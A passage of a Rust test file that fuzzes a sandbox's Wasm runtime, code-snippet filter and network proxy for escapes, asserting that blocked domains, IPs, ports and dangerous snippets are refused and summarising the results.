                let idx = (i as usize) - BLOCKED_DOMAINS.len();
                let ip_str = BLOCKED_IPS[idx];
                let ip: IpAddr = ip_str.parse().unwrap();
                let ip_label = ip_str.replace('.', "-");
                self.check(&engine, &format!("{}.com", ip_label), 443, Some(ip))
            } else if (i as usize) < BLOCKED_DOMAINS.len() + BLOCKED_IPS.len() + 8 {
                // Allowed domain but blocked port
                let port = BLOCKED_PORTS[self.rng.next_usize(BLOCKED_PORTS.len())];
                self.check(&engine, "example.com", port, None)
            } else {
                // Random domain + port
                let domain = self.rng.next_domain();
                let port = self.rng.next_port();
                self.check(&engine, &domain, port, None)
            };
            self.stats.record(&result);
            results.push(result);
        }

        self.stats.print("proxy");
        results
    }

    fn check(
        &mut self,
        engine: &ProxyEngine,
        domain: &str,
        port: u16,
        ip: Option<IpAddr>,
    ) -> EscapeResult {
        let start = Instant::now();

        let result = engine.check_connection(domain, port, ip);
        let runtime_ms = dur_ms(start);

        match result {
            CheckResult::Allowed => {
                // Determine if this should have been blocked
                let is_blocked_domain = BLOCKED_DOMAINS.contains(&domain)
                    || BLOCKED_IPS.iter().any(|b| {
                        ip.map(|r| r.to_string() == *b).unwrap_or(false)
                    })
                    || BLOCKED_PORTS.contains(&port);
                EscapeResult {
                    description: format!(
                        "proxy:{}:{} allowed{}",
                        domain, port,
                        if is_blocked_domain { " ⚠️ BYPASS" } else { "" },
                    ),
                    is_escape: is_blocked_domain,
                    blocked: !is_blocked_domain,
                    runtime_ms,
                }
            }
            CheckResult::Blocked(reason) => EscapeResult {
                description: format!("proxy:{}:{} blocked ({})", domain, port, reason),
                is_escape: false,
                blocked: true,
                runtime_ms,
            },
        }
    }
}

// ═════════════════════════════════════════════════════════════════════════
// Part 4: Integration Tests
// ═════════════════════════════════════════════════════════════════════════

/// Helper: elapsed milliseconds since `start`.
fn dur_ms(start: Instant) -> f64 {
    start.elapsed().as_secs_f64() * 1000.0
}

/// Fast test: run Wasm escape fuzzer with deterministic binary modules.
#[test]
fn fuzz_wasm_escape_attempts() {
    let count = 50;
    let mut fuzzer = WasmEscapeFuzzer::new(42);
    let results = fuzzer.run_iterations(count);
    if results.is_empty() {
        eprintln!("Wasm fuzzer skipped (engine unavailable)");
        return;
    }

    let escapes: Vec<_> = results.iter().filter(|r| r.is_escape).collect();
    let known_benign = 3; // empty, just-return, no-funcs

    assert!(
        escapes.is_empty(),
        "Wasm escapes detected ({}):\n  {}",
        escapes.len(),
        escapes.iter().map(|r| r.description.clone()).collect::<Vec<_>>().join("\n  "),
    );

    println!(
        "Wasm escape fuzzer: {} iterations, {} escapes, {} blocked, {} known-benign",
        results.len(),
        escapes.len(),
        results.iter().filter(|r| r.blocked).count(),
        known_benign,
    );
}

/// Fast test: run UOps bypass fuzzer with 35+ deterministic snippets.
#[test]
fn test_uops_bypass_fuzzer() {
    let count = (DANGEROUS_TEMPLATES.len() + SAFE_TEMPLATES.len()) as u64;
    let mut fuzzer = UOpsBypassFuzzer::new();
    let results = fuzzer.run_iterations(count);

    let escapes: Vec<_> = results.iter().filter(|r| r.is_escape).collect();
    let blocked_dangerous = results.iter()
        .take(DANGEROUS_TEMPLATES.len())
        .filter(|r| r.blocked)
        .count();
    let false_positives = results.iter()
        .skip(DANGEROUS_TEMPLATES.len())
        .filter(|r| !r.blocked)
        .count();

    // Report escapes
    if !escapes.is_empty() {
        println!("UOps escapes:");
        for e in &escapes {
            println!("  {}", e.description);
        }
    }

    // All dangerous snippets should be blocked
    assert!(
        blocked_dangerous >= DANGEROUS_TEMPLATES.len() - 2,
        "Too many dangerous snippets passed: {}/{} blocked (expected all)",
        blocked_dangerous, DANGEROUS_TEMPLATES.len(),
    );

    // Safe snippets should not be false positives
    assert!(
        false_positives == SAFE_TEMPLATES.len(),
        "Safe snippets should all pass: {}/{} passed",
        false_positives, SAFE_TEMPLATES.len(),
    );

    println!(
        "UOps bypass fuzzer: {} iterations, {} escapes, {}/{} dangerous blocked, {}/{} safe passed",
        results.len(),
        escapes.len(),
        blocked_dangerous, DANGEROUS_TEMPLATES.len(),
        false_positives, SAFE_TEMPLATES.len(),
    );
}

/// Fast test: run proxy bypass fuzzer with 50+ domain/port/IP combinations.
#[test]
fn test_proxy_bypass_fuzzer() {
    let count = 60;
    let mut fuzzer = ProxyBypassFuzzer::new(42);
    let results = fuzzer.run_iterations(count);

    let escapes: Vec<_> = results.iter().filter(|r| r.is_escape).collect();
    let blocked_count = results.iter().filter(|r| r.blocked).count();

    assert!(
        escapes.is_empty(),
        "Proxy escapes detected ({}):\n  {}",
        escapes.len(),
        escapes.iter().map(|r| r.description.clone()).collect::<Vec<_>>().join("\n  "),
    );

    println!(
        "Proxy bypass fuzzer: {} iterations, {} escapes, {}/{} blocked",
        results.len(),
        escapes.len(),
        blocked_count, results.len(),
    );
}

/// Comprehensive fuzzer: runs all three fuzzers with 500+ iterations.
///
/// This is `#[ignore]` by default because it runs ~500 iterations
/// across all backends.
#[ignore]
#[test]
fn fuzz_all_escape_attempts_comprehensive() {
    let start = Instant::now();

    println!("\n═══ Wasm Escape Fuzzer (200 iterations) ═══");
    let mut wasm_fuzzer = WasmEscapeFuzzer::new(42);
    let wasm_results = wasm_fuzzer.run_iterations(200);
    let wasm_escapes: Vec<_> = wasm_results.iter().filter(|r| r.is_escape).collect();

    println!("\n═══ UOps Bypass Fuzzer (200 iterations) ═══");
    let mut uops_fuzzer = UOpsBypassFuzzer::new();
    let uops_results = uops_fuzzer.run_iterations(200);
    let uops_escapes: Vec<_> = uops_results.iter().filter(|r| r.is_escape).collect();
    let uops_blocked = uops_results.iter().filter(|r| r.blocked).count();

    println!("\n═══ Proxy Bypass Fuzzer (200 iterations) ═══");
    let mut proxy_fuzzer = ProxyBypassFuzzer::new(456);
    let proxy_results = proxy_fuzzer.run_iterations(200);
    let proxy_escapes: Vec<_> = proxy_results.iter().filter(|r| r.is_escape).collect();
    let proxy_blocked = proxy_results.iter().filter(|r| r.blocked).count();

    let total = wasm_results.len() + uops_results.len() + proxy_results.len();
    let total_escapes = wasm_escapes.len() + uops_escapes.len() + proxy_escapes.len();
    let total_blocked = wasm_blocked_count(&wasm_results) + uops_blocked + proxy_blocked;
    let elapsed = start.elapsed();

    println!("\n═══ COMPREHENSIVE FUZZER SUMMARY ═══");
    println!("  Total iterations: {}", total);
    println!("  Total escapes:    {}", total_escapes);
    println!("  Total blocked:    {}", total_blocked);
    println!("  Elapsed:          {:.2}s", elapsed.as_secs_f64());
    println!("  Status:           {}", if total_escapes == 0 { "✅ PASS" } else { "❌ FAIL" });

    if total_escapes > 0 {
        println!("\n⚠️  ESCAPES DETECTED:");
        for e in wasm_escapes.iter().chain(uops_escapes.iter()).chain(proxy_escapes.iter()) {
            println!("  - {}", e.description);
        }
    }

    assert_eq!(total_escapes, 0, "Comprehensive fuzzer detected {} escapes", total_escapes);
}

fn wasm_blocked_count(results: &[EscapeResult]) -> usize {
    results.iter().filter(|r| r.blocked).count()
}
